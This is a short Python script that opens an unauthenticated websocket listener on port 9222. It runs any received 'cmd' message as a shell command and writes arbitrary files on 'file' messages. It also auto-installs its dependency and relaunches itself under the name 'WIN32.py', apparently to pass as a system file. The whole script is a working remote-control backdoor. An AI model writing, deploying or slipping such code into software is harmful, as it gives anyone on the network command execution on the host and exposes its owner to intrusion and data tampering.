import asyncio, os, socket
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
print(local_ip)
try:
    import websockets

    async def echo(websocket, path):
        async for message in websocket:
            print(f"Received message: {message}")
            a = message.split()
            if a[0] == "cmd":
                os.system(" ".join(a[1:]))
            elif a[0] == "file":
                with open(a[1], "w") as file:
                    file.writelines(" ".join(a[2:]))
                    file.close()
            await websocket.send("Execution succeed!")


    start_server = websockets.serve(echo, local_ip, 9222)
    asyncio.get_event_loop().run_until_complete(start_server)
    asyncio.get_event_loop().run_forever()
except ImportError:
    os.system("pip install -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple websockets")
    os.system("python WIN32.py")